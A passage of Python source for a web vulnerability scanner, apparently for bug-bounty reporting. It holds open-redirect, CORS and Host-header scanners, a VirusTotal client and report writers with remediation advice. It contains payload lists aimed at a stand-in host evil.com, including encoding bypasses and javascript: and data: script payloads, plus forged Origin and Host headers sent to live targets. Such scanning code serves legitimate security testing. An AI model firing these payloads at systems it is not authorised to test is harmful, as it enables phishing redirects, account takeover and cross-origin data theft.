
# ══════════════════════════════════════════════════════════════════
#  COMPREHENSIVE SCANNER
# ══════════════════════════════════════════════════════════════════

class OpenRedirectScanner:
    """Detects open redirect vulnerabilities in URL parameters."""

    REDIRECT_PARAMS = [
        'url', 'redirect', 'redirect_url', 'redirect_uri', 'return', 'return_url',
        'returnurl', 'next', 'next_url', 'goto', 'target', 'destination', 'dest',
        'redir', 'continue', 'back', 'link', 'location', 'forward', 'to', 'out',
        'view', 'go', 'path', 'ref', 'checkout_url', 'success_url', 'cancel_url',
    ]

    PAYLOADS = [
        "https://evil.com",
        "//evil.com",
        "//evil.com/",
        "///evil.com",
        "\\\\evil.com",
        "/\\evil.com",
        "https:evil.com",
        "http://evil.com",
        "//google.com@evil.com",
        "https://evil.com%2F%2E%2E",
        "%2F%2Fevil.com",
        "/%2F/evil.com",
        "//evil%2ecom",
        "https://evil.com#",
        "//evil.com%23",
        "javascript:alert(1)",          # JS redirect
        "data:text/html,<script>alert(1)</script>",
        # ── Protocol + encoding bypasses ──────────────────────────────────────
        "//\tevil.com",                 # tab after //
        "/\x09/evil.com",              # tab character
        "//evil。com",                 # Unicode dot
        "https://evil.com\\.target.com",# backslash confusion
        "https://target.com.evil.com", # subdomain confusion
        "/%5Cevil.com",                # URL-encoded backslash
        "//%09evil.com",               # encoded tab
        "//0.0.0.0",                   # null IP
        "//evil.com:80",               # explicit port
        "//evil.com%2500",             # double-encoded null
        "@evil.com",                   # @ confusion
        "//evil.com%2f",               # trailing encoded slash
        "////evil.com",                # quad slash
        "/\\\\evil.com",               # slash backslash combo
        "https://evil.com%09",         # trailing tab
        "https://evil.com%0a",         # trailing newline
        "https://evil.com%0d",         # trailing CR
        "//evil.com%3f.target.com",    # encoded ? as subdomain
        "//evil.com%23.target.com",    # encoded # as subdomain
        "javascript://evil.com/%0aalert(1)",  # JS URI with comment bypass
    ]

    def __init__(self, config: Config):
        self.config = config

    async def scan_url(self, client: httpx.AsyncClient, url: str) -> List[VulnerabilityResult]:
        vulns = []
        try:
            parsed = urllib.parse.urlparse(url)
            params = urllib.parse.parse_qs(parsed.query)

            # Find redirect-style params
            redirect_params = {k: v for k, v in params.items()
                               if k.lower() in self.REDIRECT_PARAMS or
                               any(w in k.lower() for w in ['redirect', 'return', 'next', 'goto', 'back'])}

            if not redirect_params:
                return vulns

            for param in list(redirect_params.keys())[:self.config.max_params_test]:
                for payload in self.PAYLOADS:
                    try:
                        tp = params.copy()
                        tp[param] = [payload]
                        tq = urllib.parse.urlencode(tp, doseq=True)
                        tu = urllib.parse.urlunparse((
                            parsed.scheme, parsed.netloc, parsed.path,
                            parsed.params, tq, parsed.fragment
                        ))

                        resp = await client.get(tu, timeout=8, follow_redirects=False)

                        # Check 3xx redirect Location header
                        if resp.status_code in (301, 302, 303, 307, 308):
                            location = resp.headers.get('location', '')
                            location_decoded = urllib.parse.unquote(location).lower()
                            # Detect: evil.com in location OR javascript: URI OR @ confusion
                            _confirmed = (
                                'evil.com' in location_decoded
                                or 'javascript:' in location_decoded
                                or ('data:' in location_decoded and 'html' in location_decoded)
                                or (location_decoded.startswith('@'))
                            )
                            if _confirmed:
                                vulns.append(VulnerabilityResult(
                                    url=url,
                                    vulnerability_type=VulnerabilityType.OPEN_REDIRECT,
                                    severity="HIGH",
                                    vulnerable_params=[param],
                                    payload_used=payload,
                                    evidence=f"HTTP {resp.status_code} → Location: {location[:100]}",
                                    details=f"Parameter '{param}' redirects to attacker-controlled URL",
                                    subtype="Open Redirect (3xx)",
                                    impact="Attackers can redirect victims to phishing pages or malware hosts via trusted domain",
                                ))
                                return vulns

                        # Check meta-refresh / JS redirect in body
                        body = resp.text.lower()
                        body_decoded = urllib.parse.unquote(body)
                        if 'evil.com' in body_decoded:
                            _redirect_patterns = [
                                r'<meta[^>]+refresh[^>]+evil\.com',
                                r'window\.location\s*=.*evil\.com',
                                r'location\.href\s*=.*evil\.com',
                                r'location\.replace\s*\(.*evil\.com',
                                r'location\.assign\s*\(.*evil\.com',
                                r'document\.location\s*=.*evil\.com',
                            ]
                            for pat in _redirect_patterns:
                                if re.search(pat, body_decoded, re.IGNORECASE):
                                    vulns.append(VulnerabilityResult(
                                        url=url,
                                        vulnerability_type=VulnerabilityType.OPEN_REDIRECT,
                                        severity="MEDIUM",
                                        vulnerable_params=[param],
                                        payload_used=payload,
                                        evidence=f"Client-side redirect to evil.com found in response body",
                                        details=f"Parameter '{param}' triggers JS/meta redirect to attacker domain",
                                        subtype="Open Redirect (Client-side)",
                                        impact="Victim redirected to malicious site via client-side JavaScript or meta-refresh",
                                    ))
                                    return vulns

                    except Exception:
                        continue
        except Exception:
            pass
        return vulns


class CORSScanner:
    """Detects CORS misconfigurations that allow cross-origin data theft."""

    def __init__(self, config: Config):
        self.config = config
        self._evil_origins = [
            "https://evil.com",
            "null",
            "https://evil.com.target.com",  # subdomain confusion
        ]

    async def scan_url(self, client: httpx.AsyncClient, url: str) -> List[VulnerabilityResult]:
        vulns = []
        try:
            for origin in self._evil_origins:
                try:
                    hdrs = random_headers()
                    hdrs["Origin"] = origin

                    resp = await client.get(url, headers=hdrs,
                                            timeout=self.config.vuln_timeout,
                                            follow_redirects=self.config.follow_redirects)

                    acao = resp.headers.get("access-control-allow-origin", "")
                    acac = resp.headers.get("access-control-allow-credentials", "").lower()

                    if not acao:
                        continue

                    # Wildcard — public info exposed, lower risk unless credentials too
                    if acao == "*":
                        vulns.append(VulnerabilityResult(
                            url=url,
                            vulnerability_type=VulnerabilityType.CORS,
                            severity="LOW",
                            vulnerable_params=["Origin header"],
                            payload_used=f"Origin: {origin}",
                            evidence=f"Access-Control-Allow-Origin: * (wildcard)",
                            details="CORS wildcard allows any origin to read responses",
                            subtype="CORS Wildcard",
                            impact="Any website can read public API responses — low risk unless authenticated endpoints exist",
                        ))
                        break

                    # Reflects arbitrary origin — exact match only to avoid FPs
                    # e.g. ACAO: https://evil.com.safe.com should NOT trigger for Origin: https://evil.com
                    _acao_normalized = acao.rstrip('/')
                    _origin_normalized = origin.rstrip('/')
                    _exact_reflection = (_acao_normalized == _origin_normalized)

                    if _exact_reflection:
                        severity = "CRITICAL" if acac == "true" else "HIGH"
                        impact_detail = (
                            "CORS with credentials — any origin can read authenticated responses and steal session data"
                            if acac == "true"
                            else "Arbitrary origin reflected exactly — cross-origin attacker can read response body"
                        )
                        vulns.append(VulnerabilityResult(
                            url=url,
                            vulnerability_type=VulnerabilityType.CORS,
                            severity=severity,
                            vulnerable_params=["Origin header"],
                            payload_used=f"Origin: {origin}",
                            evidence=(
                                f"Access-Control-Allow-Origin: {acao} | "
                                f"Access-Control-Allow-Credentials: {acac or 'not set'}"
                            ),
                            details=f"Server reflects exact Origin '{origin}' in ACAO header",
                            subtype="CORS Arbitrary Origin Reflection" + (" + Credentials" if acac == "true" else ""),
                            impact=impact_detail,
                        ))
                        return vulns

                    # null origin accepted — sandbox iframe exploitation
                    if origin == "null" and "null" in acao:
                        vulns.append(VulnerabilityResult(
                            url=url,
                            vulnerability_type=VulnerabilityType.CORS,
                            severity="HIGH",
                            vulnerable_params=["Origin header"],
                            payload_used="Origin: null",
                            evidence=f"Access-Control-Allow-Origin: null",
                            details="Server trusts 'null' origin — exploitable via sandboxed iframes",
                            subtype="CORS Null Origin",
                            impact="Attacker serves page in sandboxed iframe to achieve null origin and steal cross-origin data",
                        ))
                        return vulns

                except Exception:
                    continue
        except Exception:
            pass
        return vulns


class HostHeaderScanner:
    """Detects Host Header Injection — password reset poisoning, cache poisoning."""

    def __init__(self, config: Config):
        self.config = config

    async def scan_url(self, client: httpx.AsyncClient, url: str) -> List[VulnerabilityResult]:
        vulns = []
        try:
            parsed = urllib.parse.urlparse(url)
            real_host = parsed.netloc

            # Get baseline with real host
            try:
                baseline = await client.get(url, timeout=self.config.vuln_timeout,
                                            follow_redirects=self.config.follow_redirects)
                baseline_body = baseline.text
            except Exception:
                return vulns

            evil_host = "evil.com"
            _host_variants = [
                {"Host": evil_host},
                {"Host": real_host, "X-Forwarded-Host": evil_host},
                {"Host": real_host, "X-Host": evil_host},
                {"Host": real_host, "X-Forwarded-Server": evil_host},
                {"Host": f"{real_host}@{evil_host}"},
                {"Host": f"{evil_host}#{real_host}"},
                {"Host": f"{real_host}:{evil_host}"},
            ]

            for extra_hdrs in _host_variants:
                try:
                    hdrs = random_headers()
                    hdrs.update(extra_hdrs)
                    resp = await client.get(url, headers=hdrs,
                                            timeout=self.config.vuln_timeout,
                                            follow_redirects=self.config.follow_redirects)
                    body = resp.text

                    # Check if evil.com appears in response (e.g., in password reset link)
                    if evil_host in body and evil_host not in baseline_body:
                        # Identify the context
                        pos = body.find(evil_host)
                        snippet = body[max(0, pos - 120): pos + len(evil_host) + 120].lower()

                        # Check reset indicators in the SNIPPET context only (not whole body)
                        # Removed: 'href', 'link', 'action' — present in every HTML page
                        _reset_indicators = [
                            'reset', 'password', 'forgot', 'confirm', 'verify', 'token',
                        ]
                        is_reset = any(ind in snippet for ind in _reset_indicators)

                        header_used = next(iter(extra_hdrs))
                        vulns.append(VulnerabilityResult(
                            url=url,
                            vulnerability_type=VulnerabilityType.HOSTHEADER,
                            severity="HIGH" if is_reset else "MEDIUM",
                            vulnerable_params=[header_used],
                            payload_used=f"{header_used}: {evil_host}",
                            evidence=f"'{evil_host}' reflected in response (absent from baseline) — context: ...{snippet.strip()[:80]}...",
                            details=f"Host header '{header_used}' reflected in response — password reset poisoning possible",
                            subtype="Password Reset Poisoning" if is_reset else "Host Header Reflection",
                            impact=(
                                "Attacker poisons password reset emails to point to evil.com — account takeover"
                                if is_reset
                                else "Host header reflected — may enable cache poisoning or open redirect"
                            ),
                        ))
                        return vulns

                    # Check redirect to evil host
                    if resp.status_code in (301, 302, 307, 308):
                        location = resp.headers.get("location", "")
                        if evil_host in location:
                            header_used = next(iter(extra_hdrs))
                            vulns.append(VulnerabilityResult(
                                url=url,
                                vulnerability_type=VulnerabilityType.HOSTHEADER,
                                severity="HIGH",
                                vulnerable_params=[header_used],
                                payload_used=f"{header_used}: {evil_host}",
                                evidence=f"HTTP {resp.status_code} redirect to: {location[:100]}",
                                details=f"Injected host header causes redirect to attacker-controlled domain",
                                subtype="Host Header Redirect",
                                impact="Attacker controls redirect destination — phishing and credential theft",
                            ))
                            return vulns

                except Exception:
                    continue
        except Exception:
            pass
        return vulns


class VirusTotalAPI:
    def __init__(self, config: Config):
        self.config = config
        self.headers = {
            "x-apikey": config.api_key,
            "Accept": "application/json"
        } if config.api_key else {}
        self.enabled = bool(config.api_key)

    def _url_id(self, url: str) -> str:
        return base64.urlsafe_b64encode(url.encode()).decode().strip("=")

    async def _make_request(
        self, 
        client: httpx.AsyncClient, 
        method: str, 
        endpoint: str, 
        **kwargs
    ) -> Optional[Dict]:
        if not self.enabled:
            return None

        url = f"{self.config.base_url}/{endpoint}"

        for attempt in range(self.config.max_retries):
            try:
                response = await client.request(
                    method, 
                    url, 
                    headers=self.headers,
                    timeout=self.config.timeout,
                    **kwargs
                )

                if response.status_code == 429:
                    await asyncio.sleep(self.config.rate_limit_delay)
                    continue

                if response.status_code == 404:
                    return None

                response.raise_for_status()
                return response.json()

            except httpx.HTTPStatusError as e:
                if attempt == self.config.max_retries - 1:
                    raise
                await asyncio.sleep(self.config.retry_delay * (attempt + 1))

            except httpx.RequestError as e:
                if attempt == self.config.max_retries - 1:
                    raise
                await asyncio.sleep(self.config.retry_delay * (attempt + 1))

        return None

    async def scan_url(self, client: httpx.AsyncClient, url: str) -> ScanResult:
        if not self.enabled:
            return ScanResult(
                target=url,
                malicious=0,
                suspicious=0,
                harmless=0,
                undetected=0,
                total_engines=0,
                verdict=Verdict.UNKNOWN,
                error="VirusTotal API key not configured",
                scan_type="VirusTotal"
            )

        try:
            url = self._normalize_url(url)
            url_id = self._url_id(url)

            report = await self._make_request(client, "GET", f"urls/{url_id}")

            if not report:
                submit_response = await self._make_request(
                    client,
                    "POST",
                    "urls",
                    data={"url": url}
                )

                if submit_response:
                    analysis_id = submit_response.get("data", {}).get("id")
                    if analysis_id:
                        await asyncio.sleep(5)
                        report = await self._make_request(
                            client,
                            "GET",
                            f"analyses/{analysis_id}"
                        )

            if report and "data" in report:
                attrs = report["data"]["attributes"]
                stats = attrs.get("stats", {}) or attrs.get("results", {})

                malicious = stats.get("malicious", 0)
                suspicious = stats.get("suspicious", 0)
                harmless = stats.get("harmless", 0)
                undetected = stats.get("undetected", 0)
                total = malicious + suspicious + harmless + undetected

                verdict = self._determine_verdict(malicious, suspicious, total)

                return ScanResult(
                    target=url,
                    malicious=malicious,
                    suspicious=suspicious,
                    harmless=harmless,
                    undetected=undetected,
                    total_engines=total,
                    verdict=verdict,
                    scan_type="VirusTotal"
                )

            return ScanResult(
                target=url,
                malicious=0,
                suspicious=0,
                harmless=0,
                undetected=0,
                total_engines=0,
                verdict=Verdict.UNKNOWN,
                error="No data available",
                scan_type="VirusTotal"
            )

        except Exception as e:
            return ScanResult(
                target=url,
                malicious=0,
                suspicious=0,
                harmless=0,
                undetected=0,
                total_engines=0,
                verdict=Verdict.UNKNOWN,
                error=str(e),
                scan_type="VirusTotal"
            )

    def _normalize_url(self, url: str) -> str:
        url = url.strip()
        if not url.startswith(("http://", "https://")):
            url = "http://" + url
        return url

    def _determine_verdict(self, malicious: int, suspicious: int, total: int) -> Verdict:
        if total == 0:
            return Verdict.UNKNOWN

        malicious_ratio = malicious / total
        suspicious_ratio = suspicious / total

        if malicious_ratio >= 0.1 or malicious >= 3:
            return Verdict.MALICIOUS
        elif suspicious_ratio >= 0.2 or suspicious >= 5 or malicious > 0:
            return Verdict.SUSPICIOUS
        else:
            return Verdict.SAFE

class FileHandler:
    @staticmethod
    def read_targets(file_path: str) -> List[str]:
        try:
            with open(file_path, 'r') as f:
                lines = f.readlines()

            targets = []
            for line in lines:
                line = line.strip()
                if line and not line.startswith('#'):
                    targets.append(line)

            return targets

        except FileNotFoundError:
            raise ValueError(f"File not found: {file_path}")
        except Exception as e:
            raise ValueError(f"Error reading file: {e}")

    @staticmethod
    def save_results(results: List[ComprehensiveScanResult], output_path: str):
        output_data = []
        for result in results:
            result_dict = {
                "url": result.url,
                "timestamp": result.timestamp,
                "overall_verdict": result.overall_verdict.value,
                "virustotal": None,
                "sqli_vulnerabilities": [],
                "xss_vulnerabilities": [],
                "idor_vulnerabilities": [],
                "csrf_vulnerabilities": [],
                "rce_vulnerabilities": [],
                "lfi_vulnerabilities": [],
                "rfi_vulnerabilities": [],
                "ssrf_vulnerabilities": [],
                "fileupload_vulnerabilities": [],
                "secmisconf_vulnerabilities": [],
                "sdt_vulnerabilities": [],
                "openredirect_vulnerabilities": [],
                "cors_vulnerabilities": [],
                "hostheader_vulnerabilities": [],
                "xxe_vulnerabilities": [],
                "dirlist_vulnerabilities": [],
                "jwt_vulnerabilities": [],
                "graphql_vulnerabilities": [],
                "crlf_vulnerabilities": [],
                "prototype_vulnerabilities": [],
                "deserial_vulnerabilities": [],
                "bizlogic_vulnerabilities": [],
                "race_vulnerabilities": [],
                "clickjacking_vulnerabilities": [],
                "sensitive_vulnerabilities": [],
                "hpp_vulnerabilities": [],
                "enum_vulnerabilities": [],
                "mfa_vulnerabilities": [],
                "smuggling_vulnerabilities": [],
                "ssti_vulns": [],
                "nosqli_vulns": [],
                "massassign_vulns": [],
                "jwt_conf_vulns": [],
                "cache_vulns": [],
                "websocket_vulns": [],
                "path_trav_vulns": [],
                "api_abuse_vulns": [],
                "bopla_vulns": [],
                "ldap_vulns": [],
                "xml_vulns": [],
                "verb_vulns": [],
                "shellshock_vulns": [],
                "log4shell_vulns": [],
                "spring_vulns": [],
                "ssi_vulns": [],
                "csti_vulns": [],

            }

            if result.virustotal:
                result_dict["virustotal"] = {
                    "malicious": result.virustotal.malicious,
                    "suspicious": result.virustotal.suspicious,
                    "harmless": result.virustotal.harmless,
                    "undetected": result.virustotal.undetected,
                    "total_engines": result.virustotal.total_engines,
                    "verdict": result.virustotal.verdict.value,
                    "error": result.virustotal.error
                }

            def _vuln_dict(vuln):
                return {
                    "type": vuln.vulnerability_type.value,
                    "subtype": vuln.subtype,
                    "severity": vuln.severity,
                    "vulnerable_params": vuln.vulnerable_params,
                    "payload": vuln.payload_used,
                    "evidence": vuln.evidence,
                    "details": vuln.details,
                    "impact": vuln.impact,
                }

            for vuln in (result.sqli_vulnerabilities or []):
                result_dict["sqli_vulnerabilities"].append(_vuln_dict(vuln))
            for vuln in (result.xss_vulnerabilities or []):
                result_dict["xss_vulnerabilities"].append(_vuln_dict(vuln))
            for vuln in (result.idor_vulnerabilities or []):
                result_dict["idor_vulnerabilities"].append(_vuln_dict(vuln))
            for vuln in (result.csrf_vulnerabilities or []):
                result_dict["csrf_vulnerabilities"].append(_vuln_dict(vuln))
            for vuln in (result.rce_vulnerabilities or []):
                result_dict["rce_vulnerabilities"].append(_vuln_dict(vuln))
            for vuln in (result.lfi_vulnerabilities or []):
                result_dict["lfi_vulnerabilities"].append(_vuln_dict(vuln))
            for vuln in (result.rfi_vulnerabilities or []):
                result_dict["rfi_vulnerabilities"].append(_vuln_dict(vuln))
            for vuln in (result.ssrf_vulnerabilities or []):
                result_dict["ssrf_vulnerabilities"].append(_vuln_dict(vuln))
            for vuln in (result.fileupload_vulnerabilities or []):
                result_dict["fileupload_vulnerabilities"].append(_vuln_dict(vuln))
            for vuln in (result.secmisconf_vulnerabilities or []):
                result_dict["secmisconf_vulnerabilities"].append(_vuln_dict(vuln))
            for vuln in (result.sdt_vulnerabilities or []):
                result_dict["sdt_vulnerabilities"].append(_vuln_dict(vuln))
            for vuln in (result.openredirect_vulnerabilities or []):
                result_dict["openredirect_vulnerabilities"].append(_vuln_dict(vuln))
            for vuln in (result.cors_vulnerabilities or []):
                result_dict["cors_vulnerabilities"].append(_vuln_dict(vuln))
            for vuln in (result.hostheader_vulnerabilities or []):
                result_dict["hostheader_vulnerabilities"].append(_vuln_dict(vuln))
            for vuln in (result.xxe_vulnerabilities or []):
                result_dict["xxe_vulnerabilities"].append(_vuln_dict(vuln))
            for vuln in (result.dirlist_vulnerabilities or []):
                result_dict["dirlist_vulnerabilities"].append(_vuln_dict(vuln))
            for vuln in (result.jwt_vulnerabilities or []):
                result_dict["jwt_vulnerabilities"].append(_vuln_dict(vuln))
            for vuln in (result.graphql_vulnerabilities or []):
                result_dict["graphql_vulnerabilities"].append(_vuln_dict(vuln))
            for vuln in (result.crlf_vulnerabilities or []):
                result_dict["crlf_vulnerabilities"].append(_vuln_dict(vuln))
            for vuln in (result.prototype_vulnerabilities or []):
                result_dict["prototype_vulnerabilities"].append(_vuln_dict(vuln))
            for vuln in (result.deserial_vulnerabilities or []):
                result_dict["deserial_vulnerabilities"].append(_vuln_dict(vuln))
            for vuln in (result.bizlogic_vulnerabilities or []):
                result_dict["bizlogic_vulnerabilities"].append(_vuln_dict(vuln))
            for vuln in (result.race_vulnerabilities or []):
                result_dict["race_vulnerabilities"].append(_vuln_dict(vuln))
            for vuln in (result.clickjacking_vulnerabilities or []):
                result_dict["clickjacking_vulnerabilities"].append(_vuln_dict(vuln))
            for vuln in (result.sensitive_vulnerabilities or []):
                result_dict["sensitive_vulnerabilities"].append(_vuln_dict(vuln))
            for vuln in (result.hpp_vulnerabilities or []):
                result_dict["hpp_vulnerabilities"].append(_vuln_dict(vuln))
            for vuln in (result.enum_vulnerabilities or []):
                result_dict["enum_vulnerabilities"].append(_vuln_dict(vuln))
            for vuln in (result.mfa_vulnerabilities or []):
                result_dict["mfa_vulnerabilities"].append(_vuln_dict(vuln))
            for vuln in (result.smuggling_vulnerabilities or []):
                result_dict["smuggling_vulnerabilities"].append(_vuln_dict(vuln))
            for vuln in (result.ssti_vulns or []):
                result_dict["ssti_vulns"].append(_vuln_dict(vuln))
            for vuln in (result.nosqli_vulns or []):
                result_dict["nosqli_vulns"].append(_vuln_dict(vuln))
            for vuln in (result.massassign_vulns or []):
                result_dict["massassign_vulns"].append(_vuln_dict(vuln))
            for vuln in (result.jwt_conf_vulns or []):
                result_dict["jwt_conf_vulns"].append(_vuln_dict(vuln))
            for vuln in (result.cache_vulns or []):
                result_dict["cache_vulns"].append(_vuln_dict(vuln))
            for vuln in (result.websocket_vulns or []):
                result_dict["websocket_vulns"].append(_vuln_dict(vuln))
            for vuln in (result.path_trav_vulns or []):
                result_dict["path_trav_vulns"].append(_vuln_dict(vuln))
            for vuln in (result.api_abuse_vulns or []):
                result_dict["api_abuse_vulns"].append(_vuln_dict(vuln))
            for vuln in (result.bopla_vulns or []):
                result_dict["bopla_vulns"].append(_vuln_dict(vuln))
            for vuln in (result.ldap_vulns or []):
                result_dict["ldap_vulns"].append(_vuln_dict(vuln))
            for vuln in (result.xml_vulns or []):
                result_dict["xml_vulns"].append(_vuln_dict(vuln))
            for vuln in (result.verb_vulns or []):
                result_dict["verb_vulns"].append(_vuln_dict(vuln))
            for vuln in (result.shellshock_vulns or []):
                result_dict["shellshock_vulns"].append(_vuln_dict(vuln))
            for vuln in (result.log4shell_vulns or []):
                result_dict["log4shell_vulns"].append(_vuln_dict(vuln))
            for vuln in (result.spring_vulns or []):
                result_dict["spring_vulns"].append(_vuln_dict(vuln))
            for vuln in (result.ssi_vulns or []):
                result_dict["ssi_vulns"].append(_vuln_dict(vuln))
            for vuln in (result.csti_vulns or []):
                result_dict["csti_vulns"].append(_vuln_dict(vuln))

            output_data.append(result_dict)

        with open(output_path, 'w') as f:
            json.dump(output_data, f, indent=2)

    @staticmethod
    def get_output_dirs() -> Tuple[Path, Path]:
        if Path("/sdcard").exists():
            base = Path("/sdcard")
        elif Path.home().joinpath("Desktop").exists():
            base = Path.home() / "Desktop"
        else:
            base = Path.home()

        results_dir = base / "Y2S" / "results"
        reports_dir = base / "Y2S" / "reports"
        results_dir.mkdir(parents=True, exist_ok=True)
        reports_dir.mkdir(parents=True, exist_ok=True)
        (base / "Y2S" / "h1_reports").mkdir(parents=True, exist_ok=True)
        (base / "Y2S" / "crawler").mkdir(parents=True, exist_ok=True)
        return results_dir, reports_dir

    @staticmethod
    def domain_from_url(url: str) -> str:
        try:
            parsed = urllib.parse.urlparse(url)
            domain = parsed.netloc.replace("www.", "").replace(":", "_")
            return domain if domain else "unknown"
        except Exception:
            return "unknown"

    @staticmethod
    def auto_save(results: List['ComprehensiveScanResult']):
        results_dir, reports_dir = FileHandler.get_output_dirs()

        for result in results:
            domain = FileHandler.domain_from_url(result.url)
            ts = result.timestamp.replace(':', '-').replace('.', '-')[:19]

            json_path = results_dir / f"{domain}_{ts}.json"
            FileHandler.save_results([result], str(json_path))

            report_path = reports_dir / f"{domain}_{ts}.txt"
            total_vulns = (
                len(result.sqli_vulnerabilities or []) +
                len(result.xss_vulnerabilities or []) +
                len(result.idor_vulnerabilities or []) +
                len(result.csrf_vulnerabilities or []) +
                len(result.rce_vulnerabilities or []) +
                len(result.lfi_vulnerabilities or []) +
                len(result.rfi_vulnerabilities or []) +
                len(result.ssrf_vulnerabilities or []) +
                len(result.fileupload_vulnerabilities or []) +
                len(result.secmisconf_vulnerabilities or []) +
                len(result.sdt_vulnerabilities or []) +
                len(result.openredirect_vulnerabilities or []) +
                len(result.cors_vulnerabilities or []) +
                len(result.hostheader_vulnerabilities or []) +
                len(result.xxe_vulnerabilities or []) +
                len(result.dirlist_vulnerabilities or []) +
                len(result.jwt_vulnerabilities or []) +
                len(result.graphql_vulnerabilities or []) +
                len(result.crlf_vulnerabilities or []) +
                len(result.prototype_vulnerabilities or []) +
                len(result.deserial_vulnerabilities or []) +
                len(result.bizlogic_vulnerabilities or []) +
                len(result.race_vulnerabilities or []) +
                len(result.clickjacking_vulnerabilities or []) +
                len(result.sensitive_vulnerabilities or []) +
                len(result.hpp_vulnerabilities or []) +
                len(result.enum_vulnerabilities or []) +
                len(result.mfa_vulnerabilities or []) +
                len(result.smuggling_vulnerabilities or []) +
                len(result.ssti_vulns or []) +
                len(result.nosqli_vulns or []) +
                len(result.massassign_vulns or []) +
                len(result.jwt_conf_vulns or []) +
                len(result.cache_vulns or []) +
                len(result.websocket_vulns or []) +
                len(result.path_trav_vulns or []) +
                len(result.api_abuse_vulns or []) +
                len(result.bopla_vulns or []) +
                len(result.ldap_vulns or []) +
                len(result.xml_vulns or []) +
                len(result.verb_vulns or []) +
                len(result.shellshock_vulns or []) +
                len(result.log4shell_vulns or []) +
                len(result.spring_vulns or []) +
                len(result.ssi_vulns or []) +
                len(result.csti_vulns or [])
            )

            scan_date = result.timestamp[:10]
            scan_time = result.timestamp[11:19]
            all_vulns = (
                (result.sqli_vulnerabilities or []) +
                (result.xss_vulnerabilities or []) +
                (result.idor_vulnerabilities or []) +
                (result.csrf_vulnerabilities or []) +
                (result.rce_vulnerabilities or []) +
                (result.lfi_vulnerabilities or []) +
                (result.rfi_vulnerabilities or []) +
                (result.ssrf_vulnerabilities or []) +
                (result.fileupload_vulnerabilities or []) +
                (result.secmisconf_vulnerabilities or []) +
                (result.sdt_vulnerabilities or []) +
                (result.openredirect_vulnerabilities or []) +
                (result.cors_vulnerabilities or []) +
                (result.hostheader_vulnerabilities or []) +
                (result.xxe_vulnerabilities or []) +
                (result.dirlist_vulnerabilities or []) +
                (result.jwt_vulnerabilities or []) +
                (result.graphql_vulnerabilities or []) +
                (result.crlf_vulnerabilities or []) +
                (result.prototype_vulnerabilities or []) +
                (result.deserial_vulnerabilities or []) +
                (result.bizlogic_vulnerabilities or []) +
                (result.race_vulnerabilities or []) +
                (result.clickjacking_vulnerabilities or []) +
                (result.sensitive_vulnerabilities or []) +
                (result.hpp_vulnerabilities or []) +
                (result.enum_vulnerabilities or []) +
                (result.mfa_vulnerabilities or []) +
                (result.smuggling_vulnerabilities or []) +
                (result.ssti_vulns or []) +
                (result.nosqli_vulns or []) +
                (result.massassign_vulns or []) +
                (result.jwt_conf_vulns or []) +
                (result.cache_vulns or []) +
                (result.websocket_vulns or []) +
                (result.path_trav_vulns or []) +
                (result.api_abuse_vulns or []) +
                (result.bopla_vulns or []) +
                (result.ldap_vulns or []) +
                (result.xml_vulns or []) +
                (result.verb_vulns or []) +
                (result.shellshock_vulns or []) +
                (result.log4shell_vulns or []) +
                (result.spring_vulns or []) +
                (result.ssi_vulns or []) +
                (result.csti_vulns or [])
            )

            severity_order = {"CRITICAL": 0, "HIGH": 1, "MEDIUM": 2, "LOW": 3}
            overall_sev = "INFORMATIONAL"
            if all_vulns:
                top = min(all_vulns, key=lambda v: severity_order.get(v.severity, 99))
                overall_sev = top.severity

            lines = [
                "=" * 72,
                "  VULNERABILITY DISCLOSURE REPORT",
                "=" * 72,
                "",
                "REPORT METADATA",
                "-" * 40,
                f"  Tool              : Y2S Security Scanner",
                f"  Report Date       : {scan_date}",
                f"  Scan Time         : {scan_time} UTC",
                f"  Target URL        : {result.url}",
                f"  Overall Severity  : {overall_sev}",
                f"  Overall Verdict   : {result.overall_verdict.value}",
                f"  Total Issues      : {total_vulns}",
                "",
            ]

            if result.virustotal and not result.virustotal.error:
                vt = result.virustotal
                lines += [
                    "VIRUSTOTAL ANALYSIS",
                    "-" * 40,
                    f"  Verdict           : {vt.verdict.value}",
                    f"  Malicious Engines : {vt.malicious} / {vt.total_engines}",
                    f"  Suspicious        : {vt.suspicious}",
                    f"  Harmless          : {vt.harmless}",
                    "",
                ]

            def _section(title, vulns, param_label="Vulnerable Parameter"):
                if not vulns:
                    return []
                out = [
                    f"{'=' * 72}",
                    f"  {title.upper()} ({len(vulns)} ISSUE{'S' if len(vulns) > 1 else ''})",
                    f"{'=' * 72}",
                    "",
                ]
                for i, v in enumerate(vulns, 1):
                    out += [
                        f"  [{i}] {v.subtype or title}",
                        f"  {'─' * 60}",
                        f"  Severity          : {v.severity}",
                        f"  Affected URL      : {v.url}",
                        f"  {param_label:<18}: {', '.join(v.vulnerable_params)}",
                        f"  Proof of Concept  : {v.payload_used}",
                        f"  Evidence          : {v.evidence}",
                        f"  Description       : {v.details}",
                    ]
                    if v.impact:
                        out += [f"  Impact            : {v.impact}"]
                    out += [
                        "",
                        "  REMEDIATION",
                        "  " + "·" * 58,
                    ]
                    if "SQL" in title:
                        out += [
                            "  · Use parameterized queries / prepared statements.",
                            "  · Never concatenate user input directly into SQL queries.",
                            "  · Apply input validation and whitelist allowed characters.",
                            "  · Disable detailed SQL error messages in production.",
                        ]
                    elif "XSS" in title:
                        out += [
                            "  · Encode all user-supplied output (HTML entity encoding).",
                            "  · Implement a strict Content-Security-Policy (CSP) header.",
                            "  · Use context-aware output encoding libraries.",
                            "  · Set HttpOnly and Secure flags on all session cookies.",
                        ]
                    elif "IDOR" in title:
                        out += [
                            "  · Implement server-side authorization checks for every request.",
                            "  · Use indirect object references (UUIDs instead of sequential IDs).",
                            "  · Verify the current user owns the requested resource.",
                        ]
                    elif "CSRF" in title:
                        out += [
                            "  · Implement CSRF tokens in all state-changing forms.",
                            "  · Set SameSite=Strict or SameSite=Lax on all session cookies.",
                            "  · Add X-Frame-Options or CSP frame-ancestors header.",
                            "  · Validate the Origin and Referer headers server-side.",
                        ]
                    elif "RCE" in title or "Remote Code" in title:
                        out += [
                            "  · Never pass user input directly to system/shell commands.",
                            "  · Use language-native APIs instead of shell execution.",
                            "  · Apply strict input validation and allowlisting.",
                            "  · Run the application with minimal OS privileges.",
                        ]
                    elif "Subdomain" in title:
                        out += [
                            "  · Immediately remove or update the dangling DNS record.",
                            "  · Claim the resource on the third-party platform if still possible.",
                            "  · Audit all CNAME records regularly for unclaimed services.",
                            "  · Implement a DNS monitoring process for subdomain hygiene.",
                        ]
                    elif "Local File" in title or "LFI" in title:
                        out += [
                            "  · Never pass user-supplied input to file include functions.",
